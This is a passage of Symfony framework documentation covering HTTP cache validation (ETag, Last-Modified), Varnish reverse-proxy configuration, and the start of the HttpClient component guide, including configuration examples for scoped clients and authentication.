
Cache Invalidation
------------------

Cache invalidation is *not* part of the HTTP specification. Still, it can be really
useful to delete various HTTP cache entries as soon as some content on your site
is updated.

For details, see :doc:`/http_cache/cache_invalidation`.

Using Edge Side Includes
------------------------

When pages contain dynamic parts, you may not be able to cache entire pages,
but only parts of it. Read :doc:`/http_cache/esi` to find out how to configure
different cache strategies for specific parts of your page.

HTTP Caching and User Sessions
------------------------------

Whenever the session is started during a request, Symfony turns the response
into a private non-cacheable response. This is the best default behavior to not
cache private user information (e.g. a shopping cart, a user profile details,
etc.) and expose it to other visitors.

However, even requests making use of the session can be cached under some
circumstances. For example, information related to some user group could be
cached for all the users belonging to that group. Handling these advanced
caching scenarios is out of the scope of Symfony, but they can be solved with
the `FOSHttpCacheBundle`_.

In order to disable the default Symfony behavior that makes requests using the
session uncacheable, add the following internal header to your response and
Symfony won't modify it::

    use Symfony\Component\HttpKernel\EventListener\AbstractSessionListener;

    $response->headers->set(AbstractSessionListener::NO_AUTO_CACHE_CONTROL_HEADER, 'true');

Summary
-------

Symfony was designed to follow the proven rules of the road: HTTP. Caching
is no exception. Mastering the Symfony cache system means becoming familiar
with the HTTP cache models and using them effectively. This means that, instead
of relying only on Symfony documentation and code examples, you have access
to a world of knowledge related to HTTP caching and gateway caches such as
Varnish.

Learn more
----------

.. toctree::
    :maxdepth: 1
    :glob:

    http_cache/*

.. _`Things Caches Do`: https://tomayko.com/blog/2008/things-caches-do
.. _`Cache Tutorial`: https://www.mnot.net/cache_docs/
.. _`Varnish`: https://varnish-cache.org/
.. _`Squid in reverse proxy mode`: https://wiki.squid-cache.org/SquidFaq/ReverseProxy
.. _`RFC 7234 - Caching`: https://tools.ietf.org/html/rfc7234
.. _`RFC 7232 - Conditional Requests`: https://tools.ietf.org/html/rfc7232
.. _`FOSHttpCacheBundle`: https://foshttpcachebundle.readthedocs.org/
.. _`they can be cached`: https://tools.ietf.org/html/draft-ietf-httpbis-p2-semantics-20#section-2.3.4
HTTP Cache Validation
=====================

When a resource needs to be updated as soon as a change is made to the underlying
data, the expiration model falls short. With the `expiration model`_, the
application won't be asked to return the updated response until the cache
finally becomes stale.

The `validation model`_ addresses this issue. Under this model, the cache continues
to store responses. The difference is that, for each request, the cache asks the
application if the cached response is still valid or if it needs to be regenerated.
If the cache *is* still valid, your application should return a 304 status code
and no content. This tells the cache that it's OK to return the cached response.

Under this model, you only save CPU if you're able to determine that the
cached response is still valid by doing *less* work than generating the whole
page again (see below for an implementation example).

.. tip::

    The 304 status code means "Not Modified". It's important because with
    this status code the response does *not* contain the actual content being
    requested. Instead, the response only consists of the response headers that
    tells the cache that it can use its stored version of the content.

Like with expiration, there are two different HTTP headers that can be used
to implement the validation model: ``ETag`` and ``Last-Modified``.

.. include:: /http_cache/_expiration-and-validation.rst.inc

Validation with the ``ETag`` Header
-----------------------------------

The `HTTP ETag`_ ("entity-tag") header is an optional HTTP header whose value is
an arbitrary string that uniquely identifies one representation of the target
resource. It's entirely generated and set by your application so that you can
tell, for example, if the ``/about`` resource that's stored by the cache is
up-to-date with what your application would return.

An ``ETag`` is like a fingerprint and is used to quickly compare if two
different versions of a resource are equivalent. Like fingerprints, each
``ETag`` must be unique across all representations of the same resource.

To see a short implementation, generate the ``ETag`` as the ``md5`` of the
content::

    // src/Controller/DefaultController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;

    class DefaultController extends AbstractController
    {
        public function homepage(Request $request): Response
        {
            $response = $this->render('static/homepage.html.twig');
            $response->setEtag(md5($response->getContent()));
            $response->setPublic(); // make sure the response is public/cacheable
            $response->isNotModified($request);

            return $response;
        }
    }

The :method:`Symfony\\Component\\HttpFoundation\\Response::isNotModified`
method compares the ``If-None-Match`` header with the ``ETag`` response header.
If the two match, the method automatically sets the ``Response`` status code
to 304.

.. note::

    When using ``mod_deflate`` or ``mod_brotli`` in Apache 2.4, the original
    ``ETag`` value is modified (e.g. if ``ETag`` was ``foo``, Apache turns it
    into ``foo-gzip`` or ``foo-br``), which breaks the ``ETag``-based validation.

    You can control this behavior with the `DeflateAlterETag`_ and `BrotliAlterETag`_
    directives. Alternatively, you can use the following Apache configuration to
    keep both the original ``ETag`` and the modified one when compressing responses:

    .. code-block:: apache

        RequestHeader edit "If-None-Match" '^"((.*)-(gzip|br))"$' '"$1", "$2"'

.. note::

    The cache sets the ``If-None-Match`` header on the request to the ``ETag``
    of the original cached response before sending the request back to the
    app. This is how the cache and server communicate with each other and
    decide whether or not the resource has been updated since it was cached.

This algorithm works and is very generic, but you need to create the whole
``Response`` before being able to compute the ``ETag``, which is sub-optimal.
In other words, it saves on bandwidth, but not CPU cycles.

In the :ref:`optimizing-cache-validation` section, you'll see how validation
can be used more intelligently to determine the validity of a cache without
doing so much work.

.. tip::

    Symfony also supports weak ``ETag`` s by passing ``true`` as the second
    argument to the
    :method:`Symfony\\Component\\HttpFoundation\\Response::setEtag` method.

Validation with the ``Last-Modified`` Header
--------------------------------------------

The ``Last-Modified`` header is the second form of validation. According
to the HTTP specification, "The ``Last-Modified`` header field indicates
the date and time at which the origin server believes the representation
was last modified." In other words, the application decides whether or not
the cached content has been updated based on whether or not it's been updated
since the response was cached.

For instance, you can use the latest update date for all the objects needed to
compute the resource representation as the value for the ``Last-Modified``
header value::

    // src/Controller/ArticleController.php
    namespace App\Controller;

    // ...
    use App\Entity\Article;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;

    class ArticleController extends AbstractController
    {
        public function show(Article $article, Request $request): Response
        {
            $author = $article->getAuthor();

            $articleDate = new \DateTime($article->getUpdatedAt());
            $authorDate = new \DateTime($author->getUpdatedAt());

            $date = $authorDate > $articleDate ? $authorDate : $articleDate;

            $response = new Response();
            $response->setLastModified($date);
            // Set response as public. Otherwise it will be private by default.
            $response->setPublic();

            if ($response->isNotModified($request)) {
                return $response;
            }

            // ... do more work to populate the response with the full content

            return $response;
        }
    }

The :method:`Symfony\\Component\\HttpFoundation\\Response::isNotModified`
method compares the ``If-Modified-Since`` header with the ``Last-Modified``
response header. If they are equivalent, the ``Response`` will be set to a
304 status code.

.. note::

    The cache sets the ``If-Modified-Since`` header on the request to the ``Last-Modified``
    of the original cached response before sending the request back to the
    app. This is how the cache and server communicate with each other and
    decide whether or not the resource has been updated since it was cached.

.. _optimizing-cache-validation:

Optimizing your Code with Validation
------------------------------------

The main goal of any caching strategy is to lighten the load on the application.
Put another way, the less you do in your application to return a 304 response,
the better. The ``Response::isNotModified()`` method does exactly that::

    // src/Controller/ArticleController.php
    namespace App\Controller;

    // ...
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;

    class ArticleController extends AbstractController
    {
        public function show(string $articleSlug, Request $request): Response
        {
            // Get the minimum information to compute
            // the ETag or the Last-Modified value
            // (based on the Request, data is retrieved from
            // a database or a key-value store for instance)
            $article = ...;

            // create a Response with an ETag and/or a Last-Modified header
            $response = new Response();
            $response->setEtag($article->computeETag());
            $response->setLastModified($article->getPublishedAt());

            // Set response as public. Otherwise it will be private by default.
            $response->setPublic();

            // Check that the Response is not modified for the given Request
            if ($response->isNotModified($request)) {
                // return the 304 Response immediately
                return $response;
            }

            // do more work here - like retrieving more data
            $comments = ...;

            // or render a template with the $response you've already started
            return $this->render('article/show.html.twig', [
                'article' => $article,
                'comments' => $comments,
            ], $response);
        }
    }

When the ``Response`` is not modified, the ``isNotModified()`` automatically sets
the response status code to ``304``, removes the content, and removes some
headers that must not be present for ``304`` responses (see
:method:`Symfony\\Component\\HttpFoundation\\Response::setNotModified`).

.. _`expiration model`: https://tools.ietf.org/html/rfc2616#section-13.2
.. _`validation model`: https://tools.ietf.org/html/rfc2616#section-13.3
.. _`HTTP ETag`: https://en.wikipedia.org/wiki/HTTP_ETag
.. _`DeflateAlterETag`: https://httpd.apache.org/docs/trunk/mod/mod_deflate.html#deflatealteretag
.. _`BrotliAlterETag`: https://httpd.apache.org/docs/2.4/mod/mod_brotli.html#brotlialteretag
How to Use Varnish to Speed up my Website
=========================================

Because Symfony's cache uses the standard HTTP cache headers, the
:ref:`symfony-gateway-cache` can be replaced with any other reverse
proxy. `Varnish`_ is a powerful, open-source, HTTP accelerator capable of serving
cached content fast and including support for :doc:`Edge Side Includes </http_cache/esi>`.

Make Symfony Trust the Reverse Proxy
------------------------------------

Varnish automatically forwards the IP as ``X-Forwarded-For`` and leaves the
``X-Forwarded-Proto`` header in the request. If you do not configure Varnish as
trusted proxy, Symfony will see all requests as coming through insecure HTTP
connections from the Varnish host instead of the real client.

Remember to call the :ref:`Request::setTrustedProxies() <request-set-trusted-proxies>`
method in your front controller so that Varnish is seen as a trusted proxy
and the :ref:`X-Forwarded-* <varnish-x-forwarded-headers>` headers are used.

.. _varnish-x-forwarded-headers:

Routing and X-FORWARDED Headers
-------------------------------

To ensure that the Symfony Router generates URLs correctly with Varnish,
an ``X-Forwarded-Port`` header must be present for Symfony to use the
correct port number.

This port number corresponds to the port your setup is using to receive external
connections (``80`` is the default value for HTTP connections). If the application
also accepts HTTPS connections, there could be another proxy (as Varnish does
not do HTTPS itself) on the default HTTPS port 443 that handles the SSL termination
and forwards the requests as HTTP requests to Varnish with an ``X-Forwarded-Proto``
header. In this case, you need to add the following configuration snippet:

.. code-block:: varnish4

    sub vcl_recv {
        if (req.http.X-Forwarded-Proto == "https" ) {
            set req.http.X-Forwarded-Port = "443";
        } else {
            set req.http.X-Forwarded-Port = "80";
        }
    }

Cookies and Caching
-------------------

By default, most caching proxies do not cache anything when a request is sent
with :ref:`cookies or a basic authentication header <http-cache-introduction>`.
This is because the content of the page is supposed to depend on the cookie
value or authentication header.

If you know for sure that the backend never uses sessions or basic
authentication, have Varnish remove the corresponding header from requests to
prevent clients from bypassing the cache. In practice, you will need sessions
at least for some parts of the site, e.g. when using forms with
:doc:`CSRF Protection </security/csrf>`. In this situation, make sure to
:ref:`only start a session when actually needed <session-avoid-start>`
and clear the session when it is no longer needed. Alternatively, you can look
into :ref:`caching pages that contain CSRF protected forms <caching-pages-that-contain-csrf-protected-forms>`.

Cookies created in JavaScript and used only in the frontend, e.g. when using
Google Analytics, are nonetheless sent to the server. These cookies are not
relevant for the backend and should not affect the caching decision. Configure
your Varnish cache to `clean the cookies header`_. You want to keep the
session cookie, if there is one, and get rid of all other cookies so that pages
are cached if there is no active session. Unless you changed the default
configuration of PHP, your session cookie has the name ``PHPSESSID``:

.. configuration-block::

    .. code-block:: varnish4

        sub vcl_recv {
            // Remove all cookies except the session ID.
            if (req.http.Cookie) {
                set req.http.Cookie = ";" + req.http.Cookie;
                set req.http.Cookie = regsuball(req.http.Cookie, "; +", ";");
                set req.http.Cookie = regsuball(req.http.Cookie, ";(PHPSESSID)=", "; \1=");
                set req.http.Cookie = regsuball(req.http.Cookie, ";[^ ][^;]*", "");
                set req.http.Cookie = regsuball(req.http.Cookie, "^[; ]+|[; ]+$", "");

                if (req.http.Cookie == "") {
                    // If there are no more cookies, remove the header to get the page cached.
                    unset req.http.Cookie;
                }
            }
        }

    .. code-block:: varnish3

        sub vcl_recv {
            // Remove all cookies except the session ID.
            if (req.http.Cookie) {
                set req.http.Cookie = ";" + req.http.Cookie;
                set req.http.Cookie = regsuball(req.http.Cookie, "; +", ";");
                set req.http.Cookie = regsuball(req.http.Cookie, ";(PHPSESSID)=", "; \1=");
                set req.http.Cookie = regsuball(req.http.Cookie, ";[^ ][^;]*", "");
                set req.http.Cookie = regsuball(req.http.Cookie, "^[; ]+|[; ]+$", "");

                if (req.http.Cookie == "") {
                    // If there are no more cookies, remove the header to get page cached.
                    remove req.http.Cookie;
                }
            }
        }

.. tip::

    If content is not different for every user, but depends on the roles of a
    user, a solution is to separate the cache per group. This pattern is
    implemented and explained by the FOSHttpCacheBundle_ under the name
    `User Context`_.

Ensure Consistent Caching Behavior
----------------------------------

Varnish uses the cache headers sent by your application to determine how
to cache content. However, versions prior to Varnish 4 did not respect
``Cache-Control: no-cache``, ``no-store`` and ``private``. To ensure
consistent behavior, use the following configuration if you are still
using Varnish 3:

.. configuration-block::

    .. code-block:: varnish3

        sub vcl_fetch {
            // By default, Varnish3 ignores Cache-Control: no-cache and private
            // https://www.varnish-cache.org/docs/3.0/tutorial/increasing_your_hitrate.html#cache-control
            if (beresp.http.Cache-Control ~ "private" ||
                beresp.http.Cache-Control ~ "no-cache" ||
                beresp.http.Cache-Control ~ "no-store"
            ) {
                return (hit_for_pass);
            }
        }

.. tip::

    You can see the default behavior of Varnish in the form of a VCL file:
    `default.vcl`_ for Varnish 3, `builtin.vcl`_ for Varnish 4.

Enable Edge Side Includes (ESI)
-------------------------------

As explained in the :doc:`Edge Side Includes article </http_cache/esi>`, Symfony
detects whether it talks to a reverse proxy that understands ESI or not. When
you use the Symfony reverse proxy, you don't need to do anything. But to make
Varnish instead of Symfony resolve the ESI tags, you need some configuration
in Varnish. Symfony uses the ``Surrogate-Capability`` header from the `Edge Architecture`_
described by Akamai.

.. note::

    Varnish only supports the ``src`` attribute for ESI tags (``onerror`` and
    ``alt`` attributes are ignored).

First, configure Varnish so that it advertises its ESI support by adding a
``Surrogate-Capability`` header to requests forwarded to the backend
application:

.. code-block:: varnish4

    sub vcl_recv {
        // Add a Surrogate-Capability header to announce ESI support.
        set req.http.Surrogate-Capability = "abc=ESI/1.0";
    }

.. note::

    The ``abc`` part of the header isn't important unless you have multiple
    "surrogates" that need to advertise their capabilities. See
    `Surrogate-Capability Header`_ for details.

Then, optimize Varnish so that it only parses the response contents when there
is at least one ESI tag by checking the ``Surrogate-Control`` header that
Symfony adds automatically:

.. configuration-block::

    .. code-block:: varnish4

        sub vcl_backend_response {
            // Check for ESI acknowledgement and remove Surrogate-Control header
            if (beresp.http.Surrogate-Control ~ "ESI/1.0") {
                unset beresp.http.Surrogate-Control;
                set beresp.do_esi = true;
            }
        }

    .. code-block:: varnish3

        sub vcl_fetch {
            // Check for ESI acknowledgement and remove Surrogate-Control header
            if (beresp.http.Surrogate-Control ~ "ESI/1.0") {
                unset beresp.http.Surrogate-Control;
                set beresp.do_esi = true;
            }
        }

.. tip::

    If you followed the advice about ensuring a consistent caching
    behavior, those VCL functions already exist. Append the code
    to the end of the function, they won't interfere with each other.

Cache Invalidation
------------------

If you want to cache content that changes frequently and still serve
the most recent version to users, you need to invalidate that content.
While `cache invalidation`_ allows you to purge content from your
proxy before it has expired, it adds complexity to your caching setup.

.. tip::

    The open source `FOSHttpCacheBundle`_ takes the pain out of cache
    invalidation by helping you to organize your caching and
    invalidation setup.

    The documentation of the `FOSHttpCacheBundle`_ explains how to configure
    Varnish and other reverse proxies for cache invalidation.

.. _`Varnish`: https://varnish-cache.org/
.. _`Edge Architecture`: https://www.w3.org/TR/edge-arch
.. _`clean the cookies header`: https://varnish-cache.org/docs/7.0/reference/vmod_cookie.html
.. _`Surrogate-Capability Header`: https://www.w3.org/TR/edge-arch
.. _`cache invalidation`: https://tools.ietf.org/html/rfc2616#section-13.10
.. _`FOSHttpCacheBundle`: https://foshttpcachebundle.readthedocs.io/en/latest/features/user-context.html
.. _`default.vcl`: https://github.com/varnishcache/varnish-cache/blob/3.0/bin/varnishd/default.vcl
.. _`builtin.vcl`: https://github.com/varnishcache/varnish-cache/blob/4.1/bin/varnishd/builtin.vcl
.. _`User Context`: https://foshttpcachebundle.readthedocs.org/en/latest/features/user-context.html
HTTP Client
===========

Installation
------------

The HttpClient component is a low-level HTTP client with support for both
PHP stream wrappers and cURL. It provides utilities to consume APIs and
supports synchronous and asynchronous operations. You can install it with:

.. code-block:: terminal

    $ composer require symfony/http-client

Basic Usage
-----------

Use the :class:`Symfony\\Component\\HttpClient\\HttpClient` class to make
requests. In the Symfony framework, this class is available as the
``http_client`` service. This service will be :doc:`autowired </service_container/autowiring>`
automatically when type-hinting for :class:`Symfony\\Contracts\\HttpClient\\HttpClientInterface`:

.. configuration-block::

    .. code-block:: php-symfony

        use Symfony\Contracts\HttpClient\HttpClientInterface;

        class SymfonyDocs
        {
            public function __construct(
                private HttpClientInterface $client,
            ) {
            }

            public function fetchGitHubInformation(): array
            {
                $response = $this->client->request(
                    'GET',
                    'https://api.github.com/repos/symfony/symfony-docs'
                );

                $statusCode = $response->getStatusCode();
                // $statusCode = 200
                $contentType = $response->getHeaders()['content-type'][0];
                // $contentType = 'application/json'
                $content = $response->getContent();
                // $content = '{"id":521583, "name":"symfony-docs", ...}'
                $content = $response->toArray();
                // $content = ['id' => 521583, 'name' => 'symfony-docs', ...]

                return $content;
            }
        }

    .. code-block:: php-standalone

        use Symfony\Component\HttpClient\HttpClient;

        $client = HttpClient::create();
        $response = $client->request(
            'GET',
            'https://api.github.com/repos/symfony/symfony-docs'
        );

        $statusCode = $response->getStatusCode();
        // $statusCode = 200
        $contentType = $response->getHeaders()['content-type'][0];
        // $contentType = 'application/json'
        $content = $response->getContent();
        // $content = '{"id":521583, "name":"symfony-docs", ...}'
        $content = $response->toArray();
        // $content = ['id' => 521583, 'name' => 'symfony-docs', ...]

.. tip::

    The HTTP client is interoperable with many common HTTP client abstractions in
    PHP. You can also use any of these abstractions to profit from autowirings.
    See `Interoperability`_ for more information.

Configuration
-------------

The HTTP client contains many options you might need to take full control of
the way the request is performed, including DNS pre-resolution, SSL parameters,
public key pinning, etc. They can be defined globally in the configuration (to
apply it to all requests) and to each request (which overrides any global
configuration).

You can configure the global options using the ``default_options`` option:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            http_client:
                default_options:
                    max_redirects: 7

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:http-client>
                    <framework:default-options max-redirects="7"/>
                </framework:http-client>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->httpClient()
                ->defaultOptions()
                    ->maxRedirects(7)
            ;
        };

    .. code-block:: php-standalone

        $client = HttpClient::create([
             'max_redirects' => 7,
        ]);

You can also use the :method:`Symfony\\Contracts\\HttpClient\\HttpClientInterface::withOptions`
method to retrieve a new instance of the client with new default options::

    $this->client = $client->withOptions([
        'base_uri' => 'https://...',
        'headers' => ['header-name' => 'header-value'],
        'extra' => ['my-key' => 'my-value'],
    ]);

Alternatively, the :class:`Symfony\\Component\\HttpClient\\HttpOptions` class
brings most of the available options with type-hinted getters and setters::

    $this->client = $client->withOptions(
        (new HttpOptions())
            ->setBaseUri('https://...')
            // replaces *all* headers at once, and deletes the headers you do not provide
            ->setHeaders(['header-name' => 'header-value'])
            // set or replace a single header using addHeader()
            ->setHeader('another-header-name', 'another-header-value')
            ->toArray()
    );

.. versionadded:: 7.1

    The :method:`Symfony\\Component\\HttpClient\\HttpOptions::setHeader`
    method was introduced in Symfony 7.1.

Some options are described in this guide:

* `Authentication`_
* `Query String Parameters`_
* `Headers`_
* `Redirects`_
* `Retry Failed Requests`_
* `HTTP Proxies`_
* `Using URI Templates`_

Check out the full :ref:`http_client config reference <reference-http-client>`
to learn about all the options.

The HTTP client also has one configuration option called
``max_host_connections``, this option can not be overridden by a request:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            http_client:
                max_host_connections: 10
                # ...

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:http-client max-host-connections="10">
                    <!-- ... -->
                </framework:http-client>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->httpClient()
                ->maxHostConnections(10)
                // ...
            ;
        };

    .. code-block:: php-standalone

        $client = HttpClient::create([], 10);

Scoping Client
~~~~~~~~~~~~~~

It's common that some of the HTTP client options depend on the URL of the
request (e.g. you must set some headers when making requests to GitHub API but
not for other hosts). If that's your case, the component provides scoped
clients (using :class:`Symfony\\Component\\HttpClient\\ScopingHttpClient`) to
autoconfigure the HTTP client based on the requested URL:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            http_client:
                scoped_clients:
                    # only requests matching scope will use these options
                    github.client:
                        scope: 'https://api\.github\.com'
                        headers:
                            Accept: 'application/vnd.github.v3+json'
                            Authorization: 'token %env(GITHUB_API_TOKEN)%'
                        # ...

                    # using base_uri, relative URLs (e.g. request("GET", "/repos/symfony/symfony-docs"))
                    # will default to these options
                    github.client:
                        base_uri: 'https://api.github.com'
                        headers:
                            Accept: 'application/vnd.github.v3+json'
                            Authorization: 'token %env(GITHUB_API_TOKEN)%'
                        # ...

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:http-client>
                    <!-- only requests matching scope will use these options -->
                    <framework:scoped-client name="github.client"
                        scope="https://api\.github\.com"
                    >
                        <framework:header name="Accept">application/vnd.github.v3+json</framework:header>
                        <framework:header name="Authorization">token %env(GITHUB_API_TOKEN)%</framework:header>
                    </framework:scoped-client>

                    <!-- using base-uri, relative URLs (e.g. request("GET", "/repos/symfony/symfony-docs"))
                         will default to these options -->
                    <framework:scoped-client name="github.client"
                        base-uri="https://api.github.com"
                    >
                        <framework:header name="Accept">application/vnd.github.v3+json</framework:header>
                        <framework:header name="Authorization">token %env(GITHUB_API_TOKEN)%</framework:header>
                    </framework:scoped-client>
                </framework:http-client>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            // only requests matching scope will use these options
            $framework->httpClient()->scopedClient('github.client')
                ->scope('https://api\.github\.com')
                ->header('Accept', 'application/vnd.github.v3+json')
                ->header('Authorization', 'token %env(GITHUB_API_TOKEN)%')
                // ...
            ;

            // using base_url, relative URLs (e.g. request("GET", "/repos/symfony/symfony-docs"))
            // will default to these options
            $framework->httpClient()->scopedClient('github.client')
                ->baseUri('https://api.github.com')
                ->header('Accept', 'application/vnd.github.v3+json')
                ->header('Authorization', 'token %env(GITHUB_API_TOKEN)%')
                // ...
            ;
        };

    .. code-block:: php-standalone

        use Symfony\Component\HttpClient\HttpClient;
        use Symfony\Component\HttpClient\ScopingHttpClient;

        $client = HttpClient::create();
        $client = new ScopingHttpClient($client, [
            // the options defined as values apply only to the URLs matching
            // the regular expressions defined as keys
            'https://api\.github\.com/' => [
                'headers' => [
                    'Accept' => 'application/vnd.github.v3+json',
                    'Authorization' => 'token '.$githubToken,
                ],
            ],
            // ...
        ]);

        // relative URLs will use the 2nd argument as base URI and use the options of the 3rd argument
        $client = ScopingHttpClient::forBaseUri($client, 'https://api.github.com/', [
            'headers' => [
                'Accept' => 'application/vnd.github.v3+json',
                'Authorization' => 'token '.$githubToken,
            ],
        ]);

You can define several scopes, so that each set of options is added only if a
requested URL matches one of the regular expressions set by the ``scope`` option.

If you use scoped clients in the Symfony framework, you must use any of the
methods defined by Symfony to :ref:`choose a specific service <services-wire-specific-service>`.
Each client has a unique service named after its configuration.

Each scoped client also defines a corresponding named autowiring alias.
If you use for example
``Symfony\Contracts\HttpClient\HttpClientInterface $githubClient``
as the type and name of an argument, autowiring will inject the ``github.client``
service into your autowired classes.

.. note::

    Read the :ref:`base_uri option docs <reference-http-client-base-uri>` to
    learn the rules applied when merging relative URIs into the base URI of the
    scoped client.

Making Requests
---------------

The HTTP client provides a single ``request()`` method to perform all kinds of
HTTP requests::

    $response = $client->request('GET', 'https://...');
    $response = $client->request('POST', 'https://...');
    $response = $client->request('PUT', 'https://...');
    // ...

    // you can add request options (or override global ones) using the 3rd argument
    $response = $client->request('GET', 'https://...', [
        'headers' => [
            'Accept' => 'application/json',
        ],
    ]);

Responses are always asynchronous, so that the call to the method returns
immediately instead of waiting to receive the response::

    // code execution continues immediately; it doesn't wait to receive the response
    $response = $client->request('GET', 'http://releases.ubuntu.com/18.04.2/ubuntu-18.04.2-desktop-amd64.iso');

    // getting the response headers waits until they arrive
    $contentType = $response->getHeaders()['content-type'][0];

    // trying to get the response content will block the execution until
    // the full response content is received
    $content = $response->getContent();

This component also supports :ref:`streaming responses <http-client-streaming-responses>`
for full asynchronous applications.

Authentication
~~~~~~~~~~~~~~

The HTTP client supports different authentication mechanisms. They can be
defined globally in the configuration (to apply it to all requests) and to
each request (which overrides any global authentication):

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            http_client:
                scoped_clients:
                    example_api:
                        base_uri: 'https://example.com/'

                        # HTTP Basic authentication
                        auth_basic: 'the-username:the-password'

                        # HTTP Bearer authentication (also called token authentication)
                        auth_bearer: the-bearer-token

                        # Microsoft NTLM authentication
                        auth_ntlm: 'the-username:the-password'

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:http-client>
                    <!-- Available authentication options:
                         auth-basic: HTTP Basic authentication
                         auth-bearer: HTTP Bearer authentication (also called token authentication)
                         auth-ntlm: Microsoft NTLM authentication -->
                    <framework:scoped-client name="example_api"
                        base-uri="https://example.com/"
                        auth-basic="the-username:the-password"
                        auth-bearer="the-bearer-token"
                        auth-ntlm="the-username:the-password"
                    />
                </framework:http-client>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->httpClient()->scopedClient('example_api')
                ->baseUri('https://example.com/')
                // HTTP Basic authentication
                ->authBasic('the-username:the-password')

                // HTTP Bearer authentication (also called token authentication)
                ->authBearer('the-bearer-token')

                // Microsoft NTLM authentication
                ->authNtlm('the-username:the-password')
            ;
        };

    .. code-block:: php-standalone

        $client = HttpClient::createForBaseUri('https://example.com/', [
            // HTTP Basic authentication (there are multiple ways of configuring it)
            'auth_basic' => ['the-username'],
            'auth_basic' => ['the-username', 'the-password'],
            'auth_basic' => 'the-username:the-password',

            // HTTP Bearer authentication (also called token authentication)
            'auth_bearer' => 'the-bearer-token',

            // Microsoft NTLM authentication (there are multiple ways of configuring it)
            'auth_ntlm' => ['the-username'],
            'auth_ntlm' => ['the-username', 'the-password'],
            'auth_ntlm' => 'the-username:the-password',
        ]);

.. code-block:: php

    $response = $client->request('GET', 'https://...', [
        // use a different HTTP Basic authentication only for this request
        'auth_basic' => ['the-username', 'the-password'],

        // ...
    ]);

.. note::

    The NTLM authentication mechanism requires using the cURL transport.
    By using ``HttpClient::createForBaseUri()``, we ensure that the auth credentials
    won't be sent to any other hosts than https://example.com/.

Query String Parameters
~~~~~~~~~~~~~~~~~~~~~~~

You can either append them manually to the requested URL, or define them as an
associative array via the ``query`` option, that will be merged with the URL::

    // it makes an HTTP GET request to https://httpbin.org/get?token=...&name=...
    $response = $client->request('GET', 'https://httpbin.org/get', [
        // these values are automatically encoded before including them in the URL
        'query' => [
            'token' => '...',
            'name' => '...',
        ],
    ]);

Headers
~~~~~~~

Use the ``headers`` option to define the default headers added to all requests:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            http_client:
                default_options:
                    headers:
                        'User-Agent': 'My Fancy App'

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:http-client>
                    <framework:default-options>
                        <framework:header name="User-Agent">My Fancy App</framework:header>
                    </framework:default-options>
                </framework:http-client>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->httpClient()
                ->defaultOptions()
                    ->header('User-Agent', 'My Fancy App')
            ;
        };

    .. code-block:: php-standalone

